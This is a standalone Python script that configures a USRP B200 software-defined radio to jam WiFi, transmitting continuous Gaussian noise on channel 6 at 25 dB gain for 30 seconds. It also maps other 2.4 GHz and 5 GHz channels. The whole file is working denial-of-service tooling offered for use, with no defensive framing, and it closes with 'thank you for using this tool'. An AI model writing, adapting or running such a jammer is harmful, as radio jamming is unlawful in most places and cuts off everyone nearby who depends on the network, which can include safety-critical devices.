#!/usr/bin/env python3
import uhd
import numpy as np
import time
import signal
import sys
from datetime import datetime

class Jammer:
    def __init__(self, freq=2.437e9, rate=10e6, gain=20, duration=60):
        self.freq = freq      # WiFi Ch6 (2.437 GHz)
        self.rate = rate      # Sample rate
        self.gain = gain      # TX gain (0-30dB)
        self.duration = duration  # Seconds
        
        # Init USRP
        self.usrp = uhd.usrp.MultiUSRP("type=b200")
        self.setup_usrp()
        
        # Generate noise buffer (continuous Gaussian noise)
        self.noise = self.generate_noise(1024 * 1024)  # 1M samples buffer
        
    def setup_usrp(self):
        """Configure TX chain"""
        self.usrp.set_tx_rate(self.rate)
        tune_req = uhd.libpyuhd.types.tune_request(self.freq)
        self.usrp.set_tx_freq(tune_req, 0)
        self.usrp.set_tx_gain(self.gain, 0)
        self.usrp.set_tx_antenna("TX/RX", 0)
        print(f"🚀 USRP TX: {self.freq/1e9:.3f}GHz, {self.rate/1e6}MS/s, {self.gain}dB gain")
    
    def generate_noise(self, nsamples):
        """Complex Gaussian noise (full spectrum jam)"""
        real = np.random.normal(0, 1, nsamples)
        imag = np.random.normal(0, 1, nsamples)
        return (real + 1j * imag) / np.sqrt(2)  # Normalize power
    
    def transmit(self):
        """Stream noise continuously"""
        streamer = self.usrp.get_tx_streamer(uhd.usrp.StreamArgs("fc32", "sc16"))
        
        # Pre-fill TX buffer
        num_samps = len(self.noise)
        tx_buffer = np.zeros(num_samps, dtype=np.complex64)
        tx_buffer[:] = self.noise[:]
        
        print("📡 Jamming started... (Ctrl+C to stop)")
        metadata = uhd.types.TXMetadata()
        
        start_time = time.time()
        while time.time() - start_time < self.duration:
            streamer.send(tx_buffer, metadata)
            if metadata.has_time_spec:
                metadata.time_spec = metadata.time_spec + uhd.types.TimeSpec(0.001)
        
        print("🛑 Jamming stopped")

def signal_handler(sig, frame):
    print("\n💥 Emergency stop!")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    # WiFi channels mapping (optional CLI args)
    channels = {
        'ch1': 2.412e9, 'ch6': 2.437e9, 'ch11': 2.462e9,
        'ch36': 5.180e9, 'ch149': 5.745e9
    }
    
    jammer = Jammer(freq=channels['ch6'], gain=25, duration=30)  # 30s burst
    try:
        jammer.transmit()
    except KeyboardInterrupt:
        print("\n👋 Cleanup complete")
        print("\n thank you for using this tool ")
